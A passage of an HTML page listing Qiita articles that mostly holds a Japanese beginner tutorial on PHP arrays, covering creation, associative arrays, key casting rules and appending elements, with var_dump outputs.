    <span class="k">return</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'//u'</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nb">func_get_args</span><span class="p">()));</span>
<span class="p">}</span>
</pre></div>
</div>

<p>まだまだPHP捨てたもんじゃない！！！</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />40位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>28</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/5a30250ba2d622352959">【PHP入門講座】 配列</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-30 17:09:09</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-b949b1c587368905fa1d">目次に戻る</a>
</h3>

<h1>
<span id="配列の生成" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E3%81%AE%E7%94%9F%E6%88%90"><i class="fa fa-link"></i></a>配列の生成</h1>

<h2>
<span id="一般的に配列とは何か" class="fragment"></span><a href="#%E4%B8%80%E8%88%AC%E7%9A%84%E3%81%AB%E9%85%8D%E5%88%97%E3%81%A8%E3%81%AF%E4%BD%95%E3%81%8B"><i class="fa fa-link"></i></a><ins>一般的に</ins>配列とは何か</h2>

<p>例えば次のような要望があったとします。</p>

<p>「1ヵ月間の毎日の起床時刻を記録したデータがあります。これをPHPにて変数に格納してください。」</p>

<table>
<thead>
<tr>
<th style="text-align: right"><strong>日</strong></th>
<th style="text-align: right"><strong>時刻</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: right">1</td>
<td style="text-align: right">7</td>
</tr>
<tr>
<td style="text-align: right">2</td>
<td style="text-align: right">8</td>
</tr>
<tr>
<td style="text-align: right">3</td>
<td style="text-align: right">7</td>
</tr>
<tr>
<td style="text-align: right">…</td>
<td style="text-align: right">…</td>
</tr>
<tr>
<td style="text-align: right">31</td>
<td style="text-align: right">7</td>
</tr>
</tbody>
</table>

<p>さあ、あなたならどうしますか？<br>
(以降は簡単のため、1～3日までのデータを扱います。)</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$d1</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
<span class="nv">$d2</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
<span class="nv">$d3</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
</pre></div></div>

<p>のように連番を振った変数を作りますか？31個作った時に扱うの大変そうですね。</p>

<p>ここで <strong>配列</strong> の出番です。配列生成には <strong><code>array()</code></strong> 構文を使います。関数ではなく言語構文です。PHP5.4以降では <code>array()</code> の代わりに <code>[ ]</code> を使うことができますが、(後で説明する) <strong>キー</strong> を指定する <code>[ ]</code> と慣れるまでは紛らわしいので、この講座では <code>array()</code> で統一することにします。</p>

<p>以下のコードを実行してみましょう。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(3) {
  [0]=&gt;
  int(7)
  [1]=&gt;
  int(8)
  [2]=&gt;
  int(7)
}
</pre></div>
</div>

<p>配列とは何かを理解するためには、やっぱり <code>var_dump</code> するのが一番分かりやすいです。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>array(3)
</pre></div></div>

<p>これは、配列の要素が合計 <code>3</code> 個であることを示しています。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>[0]=&gt;
int(7)
</pre></div></div>

<p>これは、<code>0</code> 番目の値が整数の <code>7</code> であることを示しています。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>[1]=&gt;
int(8)
</pre></div></div>

<p>これは、<code>1</code> 番目の値が整数の <code>8</code> であることを示しています。</p>

<p><code>0</code> 番目から始まることに違和感を覚える人もいるかもしれませんが、 基本的に <ins>どのプログラミング言語でもこの考え方は共通</ins> となっています。徐々に慣れていきましょう。</p>

<p>なお、今回は整数を扱いましたが、実は<ins>配列はどんな型でも扱うことが出来ます</ins>。配列の中に配列を入れることも可能です ( <strong>多次元配列</strong> と呼ばれる ) 。</p>

<h2>
<span id="php言語における配列とは何か導入" class="fragment"></span><a href="#php%E8%A8%80%E8%AA%9E%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E9%85%8D%E5%88%97%E3%81%A8%E3%81%AF%E4%BD%95%E3%81%8B%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a><ins>PHP言語における</ins>配列とは何か(導入)</h2>

<p>さて、ついさっき</p>

<blockquote>
<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>[0]=&gt;
int(7)
</pre></div></div>

<p>これは、<code>0</code> 番目の値が整数の <code>7</code> であることを示しています。</p>
</blockquote>

<p>と書きましたが、これは<ins>間違っています</ins>。正しくはこうです。</p>

<blockquote>
<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>[0]=&gt;
int(7)
</pre></div></div>

<p>これは、キー <code>0</code> に対応する値が整数の <code>7</code> であることを示しています。</p>
</blockquote>

<p>ここで <strong>連想配列</strong> という考え方を導入する必要が出てきます。</p>

<h2>
<span id="連想配列とは何か" class="fragment"></span><a href="#%E9%80%A3%E6%83%B3%E9%85%8D%E5%88%97%E3%81%A8%E3%81%AF%E4%BD%95%E3%81%8B"><i class="fa fa-link"></i></a>連想配列とは何か</h2>

<p>「マジカルバナナ」というゲームを思い出してください。 <strong>『バナナといったら黄色、黄色といったら信号機』</strong> のように思いつく限りリレーのように連想する内容を繋げていく内容です。このゲームが行われていた1990年代のテレビ番組「マジカル頭脳パワー」を知らない若い世代の人は適当にWikipediaとか見てください(笑)</p>

<p>さて、この内容を連想配列で表してみます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'バナナ'</span> <span class="o">=&gt;</span> <span class="s1">'黄色'</span><span class="p">,</span>
    <span class="s1">'黄色'</span> <span class="o">=&gt;</span> <span class="s1">'信号機'</span>
<span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(2) {
  ["バナナ"]=&gt;
  string(6) "黄色"
  ["黄色"]=&gt;
  string(9) "信号機"
}
</pre></div>
</div>

<p>連想配列とは、このように <strong>「 <code>A</code> に対応する値は <code>B</code> , <code>C</code> に対応する値は <code>D</code> , ...」</strong> といったデータ構造を意味します。PHPにおける実装は上記の結果の通りです。</p>

<p>この <code>A</code> <code>C</code> のことを <strong>キー</strong> または <strong>添字</strong> 、 <code>B</code> <code>D</code> のことを <strong>値</strong> と呼びます。鍵付きの箱があって、それを開けるために必要なのが「鍵(キー)」で、中に入っているのが「値」というイメージでいいでしょう。</p>

<p>また、配列の生成に使われる演算子 <strong><code>=&gt;</code></strong> は <strong>ダブルアロー演算子</strong> と呼ばれます。アローは <strong>矢印</strong> という意味です。「クラスとオブジェクト」で学習する <strong><code>-&gt;</code></strong> は <strong>アロー演算子</strong> と呼ばれますが、これが2重(ダブル)になったものと考えてください。これらは似て非なるものです。</p>

<h2>
<span id="連想配列のキーに使えるもの" class="fragment"></span><a href="#%E9%80%A3%E6%83%B3%E9%85%8D%E5%88%97%E3%81%AE%E3%82%AD%E3%83%BC%E3%81%AB%E4%BD%BF%E3%81%88%E3%82%8B%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>連想配列のキーに使えるもの</h2>

<p>先ほど値はどんなものでも扱えると述べましたが、対照的にキーには大きな制約があります。</p>

<ul>
<li>
<strong>整数</strong> か <strong>文字列</strong> しか使えません。</li>
<li>「配列」「オブジェクト」「リソース」がキーとして使われようとするとWarningが発生します。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="s1">'foo'</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="s1">'bar'</span>
<span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>PHP Warning:  Illegal offset type in ...
</pre></div>
</div>

<ul>
<li>整数に変換可能な形式の文字列がきたとき、整数に変換されることがあります。</li>
</ul>

<p>「ことがあります」と述べたのは、それら全てが該当するわけではないからです。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'0'</span> <span class="o">=&gt;</span> <span class="s1">'A'</span><span class="p">,</span>
    <span class="s1">'+1'</span> <span class="o">=&gt;</span> <span class="s1">'B'</span><span class="p">,</span>
    <span class="s1">'-1'</span> <span class="o">=&gt;</span> <span class="s1">'C'</span><span class="p">,</span>
    <span class="s1">'00'</span> <span class="o">=&gt;</span> <span class="s1">'D'</span><span class="p">,</span>
    <span class="s1">'01'</span> <span class="o">=&gt;</span> <span class="s1">'E'</span><span class="p">,</span>
    <span class="s1">'1e1'</span> <span class="o">=&gt;</span> <span class="s1">'F'</span><span class="p">,</span>
    <span class="s1">'2147483647'</span> <span class="o">=&gt;</span> <span class="s1">'G'</span><span class="p">,</span>
    <span class="s1">'2147483648'</span> <span class="o">=&gt;</span> <span class="s1">'H'</span>
<span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">32ビット環境での実行結果</span></div>
<div class="highlight"><pre><span></span>array(8) {
  [0]=&gt;
  string(1) "A"
  ["+1"]=&gt;
  string(1) "B"
  [-1]=&gt;
  string(1) "C"
  ["00"]=&gt;
  string(1) "D"
  ["01"]=&gt;
  string(1) "E"
  ["1e1"]=&gt;
  string(1) "F"
  [2147483647]=&gt;
  string(1) "G"
  ["2147483648"]=&gt;
  string(1) "H"
}
</pre></div>
</div>

<p><code>0</code> と <code>-1</code> と <code>2147483647</code> だけが整数に変換されていますね。これからPHPの挙動を推察すると、変換される条件として<ins>「文字列を整数に変換したものをまた文字列に変換し直しても、元のデータが復元できる」</ins>ということが導かれます。加えて、整数の範囲外にある数値は無視されることも言えます。</p>

<ul>
<li>整数は <strong>オーバーフロー</strong> を起こします。</li>
</ul>

<p>通常PHPの整数がオーバーフローを起こしたときは自動的に浮動小数点数に変換されて補正されますが、<ins>配列のキーに関してはオーバーフローしたまま放置される仕様</ins>のようです。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">2147483647</span> <span class="o">=&gt;</span> <span class="s1">'A'</span><span class="p">,</span>
    <span class="mi">2147483648</span> <span class="o">=&gt;</span> <span class="s1">'B'</span>
<span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">32ビット環境での実行結果</span></div>
<div class="highlight"><pre><span></span>array(2) {
  [2147483647]=&gt;
  string(1) "A"
  [-2147483648]=&gt;
  string(1) "B"
}
</pre></div>
</div>

<ul>
<li>浮動小数点数は<ins>切り捨て</ins>られます。</li>
<li>
<code>TRUE</code> は整数の <strong><code>1</code></strong> に変換されます。</li>
<li>
<code>FALSE</code> は整数の <strong><code>0</code></strong> に変換されます。</li>
<li>
<code>NULL</code> は <strong>空文字列</strong> に変換されます。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mf">2.5</span> <span class="o">=&gt;</span> <span class="s1">'A'</span><span class="p">,</span>
    <span class="k">true</span> <span class="o">=&gt;</span> <span class="s1">'B'</span><span class="p">,</span>
    <span class="k">false</span> <span class="o">=&gt;</span> <span class="s1">'C'</span><span class="p">,</span>
    <span class="k">null</span> <span class="o">=&gt;</span> <span class="s1">'D'</span>
<span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(4) {
  [2]=&gt;
  string(1) "A"
  [1]=&gt;
  string(1) "B"
  [0]=&gt;
  string(1) "C"
  [""]=&gt;
  string(1) "D"
}
</pre></div>
</div>

<ul>
<li>同じキーが複数セットされようとしたとき、 <ins>後から出現したものが優先されます</ins>。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'A'</span><span class="p">,</span>
    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'B'</span>
<span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(2) {
  [1]=&gt;
  string(1) "B"
}
</pre></div>
</div>

<h2>
<span id="phpの配列は全て連想配列" class="fragment"></span><a href="#php%E3%81%AE%E9%85%8D%E5%88%97%E3%81%AF%E5%85%A8%E3%81%A6%E9%80%A3%E6%83%B3%E9%85%8D%E5%88%97"><i class="fa fa-link"></i></a>PHPの配列は全て連想配列？</h2>

<p>最初に示した</p>

<blockquote>
<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
</pre></div></div>
</blockquote>

<p>この例ですが、実は以下の省略形となっています。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="mi">7</span><span class="p">,</span>
    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="mi">8</span><span class="p">,</span>
    <span class="mi">2</span> <span class="o">=&gt;</span> <span class="mi">7</span>
<span class="p">);</span>
</pre></div></div>

<p>実装上は<ins>PHPの配列は全て連想配列</ins>であると言えるでしょう。但し便宜的に、上記のように<ins>0から始まる連続した整数でキーが構成される連想配列</ins>のみ、単純に「配列」と呼ぶことが一般的です。それ以外は全て「連想配列」と呼ばれます。</p>

<h2>
<span id="連想配列を書くときの心がけ" class="fragment"></span><a href="#%E9%80%A3%E6%83%B3%E9%85%8D%E5%88%97%E3%82%92%E6%9B%B8%E3%81%8F%E3%81%A8%E3%81%8D%E3%81%AE%E5%BF%83%E3%81%8C%E3%81%91"><i class="fa fa-link"></i></a>連想配列を書くときの心がけ</h2>

<p><code>array()</code> は関数ではなく言語構文であるが故に、<ins>末尾の値の後ろにカンマを入れても正しく動作する</ins>ようになっています。実は、こちらの方が推奨されています。連想配列というよりは、配列の要素を改行して縦に書き並べるとき、と言うべきでしょうか。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'バナナ'</span> <span class="o">=&gt;</span> <span class="s1">'黄色'</span><span class="p">,</span>
    <span class="s1">'黄色'</span> <span class="o">=&gt;</span> <span class="s1">'信号機'</span><span class="p">,</span>
<span class="p">);</span>
</pre></div></div>

<p>どうしてかというと、この方がソースコードを編集して配列の要素を入れ替えるとき、書き換えがラクになるからです。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'黄色'</span> <span class="o">=&gt;</span> <span class="s1">'信号機'</span><span class="p">,</span>
    <span class="s1">'バナナ'</span> <span class="o">=&gt;</span> <span class="s1">'黄色'</span><span class="p">,</span>
<span class="p">);</span>
</pre></div></div>

<p>末尾にカンマをつけていれば単純に1行を切り取って貼り付けるだけで出来ますね。今後は基本的にこれに従って書くことが多くなると思います。</p>

<h1>
<span id="配列要素の表し方" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E8%A6%81%E7%B4%A0%E3%81%AE%E8%A1%A8%E3%81%97%E6%96%B9"><i class="fa fa-link"></i></a>配列要素の表し方</h1>

<p>以下のような配列があるとします。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'X'</span><span class="p">,</span>
    <span class="s1">'A'</span> <span class="o">=&gt;</span> <span class="s1">'Y'</span><span class="p">,</span>
<span class="p">);</span>
</pre></div></div>

<h2>
<span id="整数のキー" class="fragment"></span><a href="#%E6%95%B4%E6%95%B0%E3%81%AE%E3%82%AD%E3%83%BC"><i class="fa fa-link"></i></a>整数のキー</h2>

<p>この <code>X</code> を出力したいときは、次のように書きます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</pre></div></div>

<p>こちらも配列生成時と同じように整数変換のルールが適用されるので、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'0'</span><span class="p">];</span>
</pre></div></div>

<p>としても同じ結果が得られます。</p>

<h2>
<span id="文字列のキー" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E3%82%AD%E3%83%BC"><i class="fa fa-link"></i></a>文字列のキー</h2>

<p><code>Y</code> を出力したいときは次のように書きます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'A'</span><span class="p">];</span>
</pre></div></div>

<p>こちらに関して、初心者の方が</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="nx">A</span><span class="p">];</span>
</pre></div></div>

<p>とされるケースが多く見受けられますが、こうすると <strong>定数 <code>A</code></strong> を表すようになってしまいます。もしこの定数が存在しなかった場合には <strong>Notice</strong> を発生しながらも動作するようになっていますが、これは <strong><em>歴史的な理由</em></strong> によるものであり、この書き方をするのは強く非推奨とさせていただきます。</p>

<p>だからと言って変数で指定するときにも下記のようにしてしまうのは誤りです。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">これでも動作しますが、こうする必要はありません</span></div>
<div class="highlight"><pre><span></span><span class="nv">$k</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s2">"</span><span class="si">$k</span><span class="s2">"</span><span class="p">];</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">こうするとキー「$k」となってしまうので誤りです</span></div>
<div class="highlight"><pre><span></span><span class="nv">$k</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'$k'</span><span class="p">];</span>
</pre></div>
</div>

<p>以下で十分です。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$k</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="nv">$k</span><span class="p">];</span>
</pre></div></div>

<h1>
<span id="配列の操作" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E3%81%AE%E6%93%8D%E4%BD%9C"><i class="fa fa-link"></i></a>配列の操作</h1>

<h2>
<span id="要素の書き換え" class="fragment"></span><a href="#%E8%A6%81%E7%B4%A0%E3%81%AE%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88"><i class="fa fa-link"></i></a>要素の書き換え</h2>

<p>キーを指定して代入し直します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'バナナ'</span> <span class="o">=&gt;</span> <span class="s1">'黄色'</span><span class="p">,</span>
    <span class="s1">'黄色'</span> <span class="o">=&gt;</span> <span class="s1">'信号機'</span><span class="p">,</span>
<span class="p">);</span>
<span class="nv">$data</span><span class="p">[</span><span class="s1">'黄色'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'レモン'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(2) {
  ["バナナ"]=&gt;
  string(6) "黄色"
  ["黄色"]=&gt;
  string(9) "レモン"
}
</pre></div>
</div>

<h2>
<span id="要素の追加" class="fragment"></span><a href="#%E8%A6%81%E7%B4%A0%E3%81%AE%E8%BF%BD%E5%8A%A0"><i class="fa fa-link"></i></a>要素の追加</h2>

<h3>
<span id="文字列のキー-1" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E3%82%AD%E3%83%BC-1"><i class="fa fa-link"></i></a>文字列のキー</h3>

<p>キーを指定して代入します。要素は配列の末尾に追加されます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'バナナ'</span> <span class="o">=&gt;</span> <span class="s1">'黄色'</span><span class="p">,</span>
    <span class="s1">'黄色'</span> <span class="o">=&gt;</span> <span class="s1">'信号機'</span><span class="p">,</span>
<span class="p">);</span>
<span class="nv">$data</span><span class="p">[</span><span class="s1">'信号機'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'交差点'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(3) {
  ["バナナ"]=&gt;
  string(6) "黄色"
  ["黄色"]=&gt;
  string(9) "信号機"
  ["信号機"]=&gt;
  string(9) "交差点"
}
</pre></div>
</div>

<h3>
<span id="整数のキー-1" class="fragment"></span><a href="#%E6%95%B4%E6%95%B0%E3%81%AE%E3%82%AD%E3%83%BC-1"><i class="fa fa-link"></i></a>整数のキー</h3>

<p>こちらも文字列と同様の代入を行えます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">);</span>
<span class="nv">$data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'F'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(4) {
  [0]=&gt;
  string(1) "A"
  [1]=&gt;
  string(1) "B"
  [2]=&gt;
  string(1) "C"
  [5]=&gt;
  string(1) "F"
}
</pre></div>
</div>

<p><ins>現在の最大のキーの次に追加する場合にはキーを省略することが可能</ins>です。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">);</span>
<span class="nv">$data</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'D'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(4) {
  [0]=&gt;
  string(1) "A"
  [1]=&gt;
  string(1) "B"
  [2]=&gt;
  string(1) "C"
  [3]=&gt;
  string(1) "D"
}
</pre></div>
</div>

<p>ここで少し注意点があります。</p>

<ul>
<li>
<strong>負の数</strong> の次はどんな場合でも <code>0</code> となります。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="o">-</span><span class="mi">3</span> <span class="o">=&gt;</span> <span class="s1">'A'</span><span class="p">);</span>
<span class="nv">$data</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'B'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(4) {
  [-3]=&gt;
  string(1) "A"
  [0]=&gt;
  string(1) "B"
}
</pre></div>
</div>

<ul>
<li>文字列キーと整数キーが混在した配列の場合、次の値は <strong>最大の整数キー + <code>1</code></strong> となります。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'X'</span><span class="p">,</span>
    <span class="s1">'A'</span> <span class="o">=&gt;</span> <span class="s1">'Y'</span><span class="p">,</span>
<span class="p">);</span>
<span class="nv">$data</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Z'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(4) {
  [0]=&gt;
  string(1) "X"
  ["A"]=&gt;
  string(1) "Y"
  [1]=&gt;
  string(1) "Z"
}
</pre></div>
</div>

<ul>
<li>最大の整数キー + <code>1</code> が整数の範囲を超える場合、 <strong>Warning</strong> が発生します。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">2147483647</span> <span class="o">=&gt;</span> <span class="s1">'A'</span><span class="p">);</span>
<span class="nv">$data</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'B'</span><span class="p">;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">32ビット環境での実行結果</span></div>
<div class="highlight"><pre><span></span>PHP Warning:  Cannot add element to the array as the next element is already occupied in ...
</pre></div>
</div>

<h2>
<span id="要素の削除" class="fragment"></span><a href="#%E8%A6%81%E7%B4%A0%E3%81%AE%E5%89%8A%E9%99%A4"><i class="fa fa-link"></i></a>要素の削除</h2>

<p><strong><code>unset</code></strong> 構文を用います。この構文の詳細については後ほどまた触れ直します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
